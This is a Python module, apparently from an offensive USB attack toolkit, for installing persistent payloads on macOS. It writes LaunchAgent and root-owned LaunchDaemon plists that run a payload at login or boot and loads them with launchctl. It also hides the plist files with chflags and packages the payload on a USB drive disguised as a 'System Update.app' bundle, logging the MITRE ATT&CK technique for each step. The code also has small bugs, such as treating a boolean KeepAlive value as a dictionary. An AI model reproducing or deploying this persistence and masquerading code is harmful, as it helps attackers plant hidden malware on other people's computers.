# macOS Auto-Execution Module
# Implements launch agent plist generation for USB auto-execution on macOS

import os
import sys
import subprocess
import plistlib
from datetime import datetime
from config import (
    DEBUG_MODE, MACOS_LAUNCH_AGENT_NAME, MACOS_LAUNCH_DAEMON_NAME,
    MACOS_HIDE_LAUNCH_AGENT, MITRE_LOGGING_ENABLED, MITRE_TECHNIQUES
)

class MacOSLaunchAgentManager:
    """Manages macOS launch agent/daemon creation for auto-execution"""
    
    def __init__(self):
        self.is_macos = sys.platform == "darwin"
        self.launch_agents_path = os.path.expanduser(
            "~/Library/LaunchAgents/"
        )
        self.launch_daemons_path = "/Library/LaunchDaemons/"
        self.library_launch_agents_path = "/Library/LaunchAgents/"
        
    def generate_launch_agent_plist(self, payload_path, label=None,
                                     run_at_load=True,
                                     keep_alive=False,
                                     hidden=False):
        """
        Generate a launch agent plist XML content.
        
        Args:
            payload_path: Full path to the payload executable
            label: Unique identifier for the agent (auto-generated if None)
            run_at_load: Whether to run at login
            keep_alive: Whether to keep process alive
            hidden: Whether to hide the agent
            
        Returns:
            str: XML plist content
        """
        label = label or MACOS_LAUNCH_AGENT_NAME
        
        plist_dict = {
            'Label': label,
            'ProgramArguments': [payload_path],
            'RunAtLoad': run_at_load,
            'KeepAlive': keep_alive,
            'LaunchOnlyOnce': False,
            'ProcessType': 'Background',
        }
        
        # Add user-specific settings
        if run_at_load:
            plist_dict['RunAtLoad'] = True
            
        if keep_alive:
            plist_dict['KeepAlive'] = True
            plist_dict['KeepAlive']['SuccessfulExit'] = False
        
        return plist_dict
    
    def generate_launch_daemon_plist(self, payload_path, label=None,
                                      run_at_load=True,
                                      keep_alive=True,
                                      root_owner=True):
        """
        Generate a launch daemon plist for system-wide execution.
        Requires root privileges.
        
        Args:
            payload_path: Full path to the payload executable
            label: Unique identifier for the daemon
            run_at_load: Whether to run at system startup
            keep_alive: Keep process alive
            root_owner: Whether to set root ownership
            
        Returns:
            str: XML plist content
        """
        label = label or MACOS_LAUNCH_DAEMON_NAME
        
        plist_dict = {
            'Label': label,
            'ProgramArguments': [payload_path],
            'RunAtLoad': run_at_load,
            'KeepAlive': keep_alive,
            'LaunchOnlyOnce': False,
            'ProcessType': 'Background',
            'RunAtLoad': True,
        }
        
        if root_owner:
            plist_dict['UserName'] = 'root'
        
        return plist_dict
    
    def create_launch_agent(self, payload_path, agent_path=None,
                            label=None, user_specific=True):
        """
        Create and install a launch agent plist file.
        
        Args:
            payload_path: Path to payload executable
            agent_path: Output path for plist file (auto-generated if None)
            label: Agent label
            user_specific: True for ~/Library/LaunchAgents/, False for /Library/LaunchAgents/
            
        Returns:
            dict: Result with success status and details
        """
        result = {
            'success': False,
            'plist_path': None,
            'error': None
        }
        
        if not self.is_macos:
            result['error'] = "Not running on macOS"
            return result
        
        try:
            # Generate plist content
            plist_dict = self.generate_launch_agent_plist(
                payload_path, label, run_at_load=True, keep_alive=False
            )
            
            # Determine output path
            label = label or MACOS_LAUNCH_AGENT_NAME
            if not agent_path:
                if user_specific:
                    agent_path = os.path.join(
                        self.launch_agents_path, 
                        f"{label}.plist"
                    )
                else:
                    agent_path = os.path.join(
                        self.library_launch_agents_path,
                        f"{label}.plist"
                    )
            
            # Create directory if needed
            os.makedirs(os.path.dirname(agent_path), exist_ok=True)
            
            # Write plist file
            with open(agent_path, 'wb') as f:
                plistlib.dump(plist_dict, f)
            
            result['plist_path'] = agent_path
            result['success'] = True
            
            if DEBUG_MODE:
                print(f"Created launch agent plist: {agent_path}")
            
            return result
            
        except Exception as e:
            result['error'] = str(e)
            if DEBUG_MODE:
                print(f"Failed to create launch agent: {e}")
            return result
    
    def create_launch_daemon(self, payload_path, daemon_path=None,
                             label=None, require_root=True):
        """
        Create and install a launch daemon plist file.
        Requires root privileges.
        
        Args:
            payload_path: Path to payload executable
            daemon_path: Output path for plist file
            label: Daemon label
            require_root: Whether to set root ownership
            
        Returns:
            dict: Result with success status
        """
        result = {
            'success': False,
            'plist_path': None,
            'error': None
        }
        
        if not self.is_macos:
            result['error'] = "Not running on macOS"
            return result
        
        try:
            # Generate plist content
            plist_dict = self.generate_launch_daemon_plist(
                payload_path, label, run_at_load=True, keep_alive=True
            )
            
            # Determine output path
            label = label or MACOS_LAUNCH_DAEMON_NAME
            if not daemon_path:
                daemon_path = os.path.join(
                    self.launch_daemons_path,
                    f"{label}.plist"
                )
            
            # Write plist file
            with open(daemon_path, 'wb') as f:
                plistlib.dump(plist_dict, f)
            
            # Set permissions if require root
            if require_root:
                os.chmod(daemon_path, 0o644)
                try:
                    subprocess.run(
                        ['chown', 'root:wheel', daemon_path],
                        capture_output=True
                    )
                except Exception:
                    pass
            
            result['plist_path'] = daemon_path
            result['success'] = True
            
            if DEBUG_MODE:
                print(f"Created launch daemon plist: {daemon_path}")
            
            return result
            
        except Exception as e:
            result['error'] = str(e)
            if DEBUG_MODE:
                print(f"Failed to create launch daemon: {e}")
            return result
    
    def load_launch_agent(self, plist_path):
        """
        Load (activate) a launch agent.
        
        Args:
            plist_path: Path to the plist file
            
        Returns:
            bool: True if successful
        """
        if not self.is_macos:
            return False
        
        try:
            result = subprocess.run(
                ['launchctl', 'load', plist_path],
                capture_output=True,
                text=True
            )
            return result.returncode == 0
        except Exception:
            return False
    
    def unload_launch_agent(self, plist_path):
        """
        Unload (deactivate) a launch agent.
        
        Args:
            plist_path: Path to the plist file
            
        Returns:
            bool: True if successful
        """
        if not self.is_macos:
            return False
        
        try:
            result = subprocess.run(
                ['launchctl', 'unload', plist_path],
                capture_output=True,
                text=True
            )
            return result.returncode == 0
        except Exception:
            return False
    
    def hide_plist_file(self, plist_path):
        """Set hidden attribute on plist file"""
        if not self.is_macos:
            return
        
        try:
            # Set hidden flag using chflags
            subprocess.run(
                ['chflags', 'hidden', plist_path],
                capture_output=True
            )
        except Exception:
            pass
    
    def install_agent_with_autostart(self, payload_path, label=None):
        """
        Complete installation: create plist and load it.
        
        Args:
            payload_path: Path to payload executable
            label: Agent label
            
        Returns:
            dict: Installation result
        """
        result = {
            'success': False,
            'plist_path': None,
            'loaded': False,
            'error': None
        }
        
        # Create the agent
        create_result = self.create_launch_agent(payload_path, label=label)
        if not create_result['success']:
            return create_result
        
        result['plist_path'] = create_result['plist_path']
        
        # Hide if configured
        if MACOS_HIDE_LAUNCH_AGENT:
            self.hide_plist_file(result['plist_path'])
        
        # Load the agent
        if self.load_launch_agent(result['plist_path']):
            result['loaded'] = True
            result['success'] = True
        else:
            result['error'] = "Failed to load launch agent"
        
        return result
    
    def validate_plist(self, plist_path):
        """
        Validate plist file structure.
        
        Args:
            plist_path: Path to plist file
            
        Returns:
            bool: True if valid
        """
        try:
            with open(plist_path, 'rb') as f:
                plistlib.load(f)
            return True
        except Exception:
            return False
    
    def get_agent_status(self, label):
        """
        Check if a launch agent is loaded.
        
        Args:
            label: Agent label
            
        Returns:
            bool: True if loaded
        """
        if not self.is_macos:
            return False
        
        try:
            result = subprocess.run(
                ['launchctl', 'list'],
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                return any(label in line for line in result.stdout.split('\n'))
            return False
        except Exception:
            return False
    
    def log_technique(self, technique_id, success, details):
        """Log MITRE ATT&CK technique execution"""
        if MITRE_LOGGING_ENABLED and DEBUG_MODE:
            technique_name = MITRE_TECHNIQUES.get(technique_id, 'Unknown')
            status = 'Success' if success else 'Failed'
            print(f"Technique {technique_id} ({technique_name}): {status}")


class MacOSUSBAutoExecution:
    """Manages USB-based auto-execution on macOS"""
    
    def __init__(self):
        self.agent_manager = MacOSLaunchAgentManager()
        self.payload_name = "System Update.app"
        
    def create_usb_package(self, usb_drive_path, payload_file_path,
                           disguise_as_app=True):
        """
        Create a macOS USB package with auto-execution.
        
        Args:
            usb_drive_path: USB root path
            payload_file_path: Path to payload executable
            disguise_as_app: Create as .app bundle
            
        Returns:
            dict: Result with success status
        """
        result = {
            'success': False,
            'app_path': None,
            'agent_path': None,
            'error': None
        }
        
        try:
            if disguise_as_app:
                # Create .app bundle
                app_path = os.path.join(
                    usb_drive_path, 
                    self.payload_name
                )
                contents_path = os.path.join(app_path, "Contents")
                macos_path = os.path.join(contents_path, "MacOS")
                
                os.makedirs(macos_path, exist_ok=True)
                
                # Copy payload
                payload_dest = os.path.join(macos_path, "System Update")
                import shutil
                shutil.copy2(payload_file_path, payload_dest)
                os.chmod(payload_dest, 0o755)
                
                # Create Info.plist
                info_plist = {
                    'CFBundleExecutable': 'System Update',
                    'CFBundleIdentifier': MACOS_LAUNCH_AGENT_NAME,
                    'CFBundleName': 'System Update',
                    'CFBundlePackageType': 'APPL',
                    'CFBundleShortVersionString': '1.0',
                    'CFBundleVersion': '1',
                }
                
                with open(os.path.join(contents_path, "Info.plist"), 'wb') as f:
                    plistlib.dump(info_plist, f)
                
                result['app_path'] = app_path
                
                # Set custom icon if exists (optional)
                # This would require an .icns file
                
            else:
                # Just copy the executable
                payload_dest = os.path.join(usb_drive_path, "System Update")
                import shutil
                shutil.copy2(payload_file_path, payload_dest)
                os.chmod(payload_dest, 0o755)
                result['app_path'] = payload_dest
            
            result['success'] = True
            
            if DEBUG_MODE:
                print(f"Created macOS USB package: {result['app_path']}")
            
            return result
            
        except Exception as e:
            result['error'] = str(e)
            if DEBUG_MODE:
                print(f"Failed to create USB package: {e}")
            return result


# Global instances
macos_launch_agent_manager = MacOSLaunchAgentManager()
macos_usb_auto_execution = MacOSUSBAutoExecution()
